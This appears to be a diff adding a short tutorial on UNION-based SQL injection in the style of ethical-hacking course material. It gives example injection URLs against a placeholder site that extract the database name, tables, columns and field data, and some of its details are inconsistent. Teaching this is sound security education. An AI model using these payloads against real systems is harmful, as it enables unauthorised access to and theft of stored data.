@@ -1,0 +1,33 @@
+In UNION SQL injection, an attacker uses the UNION clause to concatenate a malicious query with the original query to retrieve results from the target database table. 
+
+An attacker checks for this vulnerability by adding a tick at the end of a ".php? id=" file. 
+
+If it comes back with a MySQL error, the site is most likely vulnerable to UNION SQL injection.
+
+The attacker then proceeds to use ORDER BY to find the columns and finally uses the UNION ALL SELECT command
+
+▪ Extract Database Name 
+http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,DB_NAME,3,4--
+[DB_NAME] Returned from the server
+
+▪ Extract Database Tables
+http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
+[EMPLOYEE_TABLE] Returned from the server
+
+▪ Extract Table Column Names
+http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name ='EMPLOYEE_TABLE'--
+[EMPLOYEE_NAME] 
+
+▪ Extract 1st Field Data
+http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --
+[FIELD 1 VALUE] Returned from the server
+
+
+
+
+
+
+
+
+
+
